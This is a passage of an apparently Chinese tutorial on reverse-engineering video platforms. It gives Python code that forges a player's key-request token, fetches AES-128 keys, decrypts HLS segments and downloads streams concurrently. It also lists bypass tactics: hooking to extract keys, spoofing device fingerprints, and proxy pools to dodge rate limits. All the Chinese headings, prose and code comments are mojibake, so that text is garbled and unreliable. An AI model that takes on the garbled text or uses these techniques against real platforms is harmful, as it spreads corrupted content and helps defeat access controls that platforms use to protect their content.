            <span class="k">return</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">][</span><span class="s1">&#39;url&#39;</span><span class="p">]</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Failed to get play url: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">download_video</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">vid</span><span class="p">,</span> <span class="n">output_path</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä¸‹è½½è§†é¢‘&quot;&quot;&quot;</span>
        <span class="n">play_url</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_play_url</span><span class="p">(</span><span class="n">vid</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Play URL: </span><span class="si">{</span><span class="n">play_url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

        <span class="c1"># ä¸‹è½½ M3U8 æˆ–ç›´æ¥è§†é¢‘</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">play_url</span><span class="p">,</span> <span class="n">stream</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_path</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">iter_content</span><span class="p">(</span><span class="n">chunk_size</span><span class="o">=</span><span class="mi">8192</span><span class="p">):</span>
                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">downloader</span> <span class="o">=</span> <span class="n">VideoDownloader</span><span class="p">()</span>
<span class="n">downloader</span><span class="o">.</span><span class="n">download_video</span><span class="p">(</span><span class="s1">&#39;abc123&#39;</span><span class="p">,</span> <span class="s1">&#39;video.mp4&#39;</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="é˜²æŠ¤ä¸å¯¹æŠ—">é˜²æŠ¤ä¸å¯¹æŠ—</h3>

      <p><strong>é˜²æŠ¤æ–¹</strong>:</p>

      <ul>
        <li>å¯†é’¥å®šæœŸè½®æ¢</li>
        <li>ä½¿ç”¨è®¾å¤‡æŒ‡çº¹ç»‘å®šç­¾å</li>
        <li>æ·»åŠ æ’­æ”¾æ¬¡æ•°é™åˆ¶</li>
        <li>IP é™é€Ÿå’Œé¢‘ç‡æ£€æµ‹</li>
      </ul>

      <p><strong>ç»•è¿‡æ–¹</strong>:</p>

      <ul>
        <li>å®æ—¶æå–æœ€æ–°å¯†é’¥ï¼ˆé€šè¿‡ Hookï¼‰</li>
        <li>æ¨¡æ‹ŸçœŸå®æ’­æ”¾å™¨çš„è®¾å¤‡æŒ‡çº¹</li>
        <li>ä½¿ç”¨ä»£ç†æ± åˆ†æ•£è¯·æ±‚</li>
      </ul>

      <hr />

      <h2 id="æ¡ˆä¾‹-2-m3u8hls-æµè§£æä¸ä¸‹è½½">æ¡ˆä¾‹ 2: M3U8/HLS æµè§£æä¸ä¸‹è½½</h2>

      <h3 id="èƒŒæ™¯-2">èƒŒæ™¯</h3>

      <p>ä¸»æµè§†é¢‘å¹³å°ä½¿ç”¨ HLS (HTTP Live Streaming) åè®®ï¼Œè§†é¢‘è¢«åˆ‡åˆ†æˆå¤šä¸ª TS ç‰‡æ®µï¼Œé€šè¿‡ M3U8 ç´¢å¼•æ–‡ä»¶ç»„ç»‡ã€‚</p>

      <h3 id="é€†å‘æ­¥éª¤-2">é€†å‘æ­¥éª¤</h3>

      <h4 id="1-m3u8-æ–‡ä»¶ç»“æ„">1. M3U8 æ–‡ä»¶ç»“æ„</h4>

      <p><strong>Master Playlist</strong> (å¤šç ç‡):</p>

      <pre><code>#EXTM3U
#EXT-X-STREAM-INF:BANDWIDTH=1280000,RESOLUTION=1280x720
https://cdn.example.com/video/720p.m3u8
#EXT-X-STREAM-INF:BANDWIDTH=2560000,RESOLUTION=1920x1080
https://cdn.example.com/video/1080p.m3u8
</code></pre>

      <p><strong>Media Playlist</strong> (TS ç‰‡æ®µåˆ—è¡¨):</p>

      <pre><code>#EXTM3U
#EXT-X-VERSION:3
#EXT-X-TARGETDURATION:10
#EXT-X-KEY:METHOD=AES-128,URI="https://cdn.example.com/key/abc123",IV=0x12345678901234567890123456789012
#EXTINF:10.0,
segment0.ts
#EXTINF:10.0,
segment1.ts
#EXTINF:10.0,
segment2.ts
#EXT-X-ENDLIST
</code></pre>

      <h4 id="2-aes-128-åŠ å¯†è§£æ">2. AES-128 åŠ å¯†è§£æ</h4>

      <p>TS ç‰‡æ®µé€šå¸¸ä½¿ç”¨ AES-128-CBC åŠ å¯†ï¼Œéœ€è¦è·å–è§£å¯†å¯†é’¥:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨æ’­æ”¾å™¨ä»£ç ä¸­æ‰¾åˆ°å¯†é’¥è·å–é€»è¾‘</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">getDecryptionKey</span><span class="p">(</span><span class="nx">keyUri</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">keyUri</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="s1">&#39;X-Key-Token&#39;</span><span class="o">:</span><span class="w"> </span><span class="nx">generateKeyToken</span><span class="p">()</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">arrayBuffer</span><span class="p">());</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">generateKeyToken</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">timestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">nonce</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">().</span><span class="nx">toString</span><span class="p">(</span><span class="mf">36</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">btoa</span><span class="p">(</span><span class="nx">timestamp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;:&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">nonce</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="python-å®ç°-2">Python å®ç°</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Cipher</span><span class="w"> </span><span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">concurrent.futures</span><span class="w"> </span><span class="kn">import</span> <span class="n">ThreadPoolExecutor</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">urljoin</span>

<span class="k">class</span><span class="w"> </span><span class="nc">M3U8Downloader</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">m3u8_url</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">m3u8_url</span> <span class="o">=</span> <span class="n">m3u8_url</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">update</span><span class="p">({</span>
            <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#39;</span>
        <span class="p">})</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">parse_m3u8</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">base_url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è§£æ M3U8 æ–‡ä»¶&quot;&quot;&quot;</span>
        <span class="n">lines</span> <span class="o">=</span> <span class="n">content</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
        <span class="n">segments</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">key_info</span> <span class="o">=</span> <span class="kc">None</span>

        <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">lines</span><span class="p">):</span>
            <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>

            <span class="c1"># è§£æåŠ å¯†å¯†é’¥</span>
            <span class="k">if</span> <span class="n">line</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;#EXT-X-KEY&#39;</span><span class="p">):</span>
                <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;METHOD=([^,]+),URI=&quot;([^&quot;]+)&quot;(?:,IV=(.+))?&#39;</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
                    <span class="n">method</span><span class="p">,</span> <span class="n">uri</span><span class="p">,</span> <span class="n">iv</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">groups</span><span class="p">()</span>
                    <span class="n">key_url</span> <span class="o">=</span> <span class="n">urljoin</span><span class="p">(</span><span class="n">base_url</span><span class="p">,</span> <span class="n">uri</span><span class="p">)</span>
                    <span class="n">key_info</span> <span class="o">=</span> <span class="p">{</span>
                        <span class="s1">&#39;method&#39;</span><span class="p">:</span> <span class="n">method</span><span class="p">,</span>
                        <span class="s1">&#39;uri&#39;</span><span class="p">:</span> <span class="n">key_url</span><span class="p">,</span>
                        <span class="s1">&#39;iv&#39;</span><span class="p">:</span> <span class="n">iv</span>
                    <span class="p">}</span>

            <span class="c1"># è§£æ TS ç‰‡æ®µ</span>
            <span class="k">elif</span> <span class="n">line</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;#EXTINF&#39;</span><span class="p">):</span>
                <span class="k">if</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">lines</span><span class="p">):</span>
                    <span class="n">segment_url</span> <span class="o">=</span> <span class="n">urljoin</span><span class="p">(</span><span class="n">base_url</span><span class="p">,</span> <span class="n">lines</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
                    <span class="n">segments</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">segment_url</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">segments</span><span class="p">,</span> <span class="n">key_info</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_decryption_key</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">key_url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–è§£å¯†å¯†é’¥&quot;&quot;&quot;</span>
        <span class="c1"># æ·»åŠ å¿…è¦çš„è¯·æ±‚å¤´</span>
        <span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
        <span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
        <span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>

        <span class="n">timestamp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">)</span>
        <span class="n">nonce</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="s1">&#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">8</span><span class="p">))</span>
        <span class="n">token</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">timestamp</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">nonce</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>

        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;X-Key-Token&#39;</span><span class="p">:</span> <span class="n">token</span><span class="p">}</span>
        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">key_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">content</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">decrypt_segment</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">encrypted_data</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è§£å¯† TS ç‰‡æ®µ&quot;&quot;&quot;</span>
        <span class="k">if</span> <span class="n">iv</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">):</span>
            <span class="n">iv_bytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">iv</span><span class="p">[</span><span class="mi">2</span><span class="p">:])</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">iv_bytes</span> <span class="o">=</span> <span class="n">iv</span><span class="o">.</span><span class="n">encode</span><span class="p">()[:</span><span class="mi">16</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">)</span>

        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv_bytes</span><span class="p">)</span>
        <span class="n">decrypted</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">)</span>

        <span class="c1"># ç§»é™¤ PKCS7 å¡«å……</span>
        <span class="n">padding_length</span> <span class="o">=</span> <span class="n">decrypted</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
        <span class="k">return</span> <span class="n">decrypted</span><span class="p">[:</span><span class="o">-</span><span class="n">padding_length</span><span class="p">]</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">download_segment</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">key_info</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä¸‹è½½å¹¶è§£å¯†å•ä¸ªç‰‡æ®µ&quot;&quot;&quot;</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">content</span>

            <span class="c1"># å¦‚æœæœ‰åŠ å¯†ï¼Œè¿›è¡Œè§£å¯†</span>
            <span class="k">if</span> <span class="n">key_info</span> <span class="ow">and</span> <span class="n">key_info</span><span class="p">[</span><span class="s1">&#39;method&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;AES-128&#39;</span><span class="p">:</span>
                <span class="n">key</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_decryption_key</span><span class="p">(</span><span class="n">key_info</span><span class="p">[</span><span class="s1">&#39;uri&#39;</span><span class="p">])</span>
                <span class="n">iv</span> <span class="o">=</span> <span class="n">key_info</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;iv&#39;</span><span class="p">,</span> <span class="sa">f</span><span class="s1">&#39;0x</span><span class="si">{</span><span class="n">index</span><span class="si">:</span><span class="s1">032x</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
                <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">decrypt_segment</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>

            <span class="k">return</span> <span class="n">index</span><span class="p">,</span> <span class="n">data</span>
        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Failed to download segment </span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">index</span><span class="p">,</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">download</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">output_path</span><span class="p">,</span> <span class="n">max_workers</span><span class="o">=</span><span class="mi">10</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä¸‹è½½å®Œæ•´è§†é¢‘&quot;&quot;&quot;</span>
        <span class="c1"># è·å– M3U8 å†…å®¹</span>
        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">m3u8_url</span><span class="p">)</span>
        <span class="n">m3u8_content</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>

        <span class="c1"># æ£€æŸ¥æ˜¯å¦æ˜¯ Master Playlist</span>
        <span class="k">if</span> <span class="s1">&#39;#EXT-X-STREAM-INF&#39;</span> <span class="ow">in</span> <span class="n">m3u8_content</span><span class="p">:</span>
            <span class="c1"># é€‰æ‹©æœ€é«˜è´¨é‡</span>
            <span class="n">lines</span> <span class="o">=</span> <span class="n">m3u8_content</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
            <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">lines</span><span class="p">):</span>
                <span class="k">if</span> <span class="n">line</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;#EXT-X-STREAM-INF&#39;</span><span class="p">):</span>
                    <span class="k">if</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">lines</span><span class="p">):</span>
                        <span class="n">best_quality_url</span> <span class="o">=</span> <span class="n">urljoin</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">m3u8_url</span><span class="p">,</span> <span class="n">lines</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
                        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">best_quality_url</span><span class="p">)</span>
                        <span class="n">m3u8_content</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>
                        <span class="k">break</span>

        <span class="c1"># è§£æ M3U8</span>
        <span class="n">base_url</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">m3u8_url</span><span class="o">.</span><span class="n">rsplit</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;/&#39;</span>
        <span class="n">segments</span><span class="p">,</span> <span class="n">key_info</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse_m3u8</span><span class="p">(</span><span class="n">m3u8_content</span><span class="p">,</span> <span class="n">base_url</span><span class="p">)</span>

        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Found </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">segments</span><span class="p">)</span><span class="si">}</span><span class="s2"> segments&quot;</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">key_info</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Encryption: </span><span class="si">{</span><span class="n">key_info</span><span class="p">[</span><span class="s1">&#39;method&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

        <span class="c1"># å¹¶å‘ä¸‹è½½æ‰€æœ‰ç‰‡æ®µ</span>
        <span class="k">with</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="n">max_workers</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
            <span class="n">futures</span> <span class="o">=</span> <span class="p">[</span>
                <span class="n">executor</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">download_segment</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">key_info</span><span class="p">)</span>
                <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">url</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">segments</span><span class="p">)</span>
            <span class="p">]</span>

            <span class="n">results</span> <span class="o">=</span> <span class="p">[</span><span class="n">future</span><span class="o">.</span><span class="n">result</span><span class="p">()</span> <span class="k">for</span> <span class="n">future</span> <span class="ow">in</span> <span class="n">futures</span><span class="p">]</span>

        <span class="c1"># æŒ‰é¡ºåºåˆå¹¶ç‰‡æ®µ</span>
        <span class="n">results</span><span class="o">.</span><span class="n">sort</span><span class="p">(</span><span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>

        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_path</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">index</span><span class="p">,</span> <span class="n">data</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
                    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Video saved to: </span><span class="si">{</span><span class="n">output_path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">downloader</span> <span class="o">=</span> <span class="n">M3U8Downloader</span><span class="p">(</span><span class="s1">&#39;https://cdn.example.com/video/1080p.m3u8&#39;</span><span class="p">)</span>
<span class="n">downloader</span><span class="o">.</span><span class="n">download</span><span class="p">(</span><span class="s1">&#39;output.mp4&#39;</span><span class="p">,</span> <span class="n">max_workers</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="é«˜çº§æŠ€å·§">é«˜çº§æŠ€å·§</h3>

      <p><strong>1. å¤„ç†åŠ¨æ€ M3U8</strong>:<br />
        æŸäº›ç›´æ’­æµçš„ M3U8 ä¼šå®æ—¶æ›´æ–°ï¼Œéœ€è¦å¾ªç¯è·å–:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">download_live_stream</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">output_path</span><span class="p">,</span> <span class="n">duration</span><span class="o">=</span><span class="mi">3600</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ä¸‹è½½ç›´æ’­æµï¼ˆæŒ‡å®šæ—¶é•¿ï¼‰&quot;&quot;&quot;</span>
    <span class="n">downloaded_segments</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
    <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_path</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="k">while</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span> <span class="o">&lt;</span> <span class="n">duration</span><span class="p">:</span>
            <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">m3u8_url</span><span class="p">)</span>
            <span class="n">segments</span><span class="p">,</span> <span class="n">key_info</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse_m3u8</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">m3u8_url</span><span class="p">)</span>

            <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">url</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">segments</span><span class="p">):</span>
                <span class="k">if</span> <span class="n">url</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">downloaded_segments</span><span class="p">:</span>
                    <span class="n">_</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">download_segment</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">key_info</span><span class="p">)</span>
                    <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
                        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
                        <span class="n">downloaded_segments</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>  <span class="c1"># ç­‰å¾…æ–°ç‰‡æ®µ</span>
</code></pre>
      </div>

      <p><strong>2. è§£æ MPEG-DASH</strong> (æ›¿ä»£ HLS):</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">xml.etree</span><span class="w"> </span><span class="kn">import</span> <span class="n">ElementTree</span> <span class="k">as</span> <span class="n">ET</span>

<span class="k">def</span><span class="w"> </span><span class="nf">parse_mpd</span><span class="p">(</span><span class="n">mpd_url</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;è§£æ MPEG-DASH MPD æ–‡ä»¶&quot;&quot;&quot;</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">mpd_url</span><span class="p">)</span>
    <span class="n">root</span> <span class="o">=</span> <span class="n">ET</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>

    <span class="c1"># æå–è§†é¢‘å’ŒéŸ³é¢‘æµ</span>
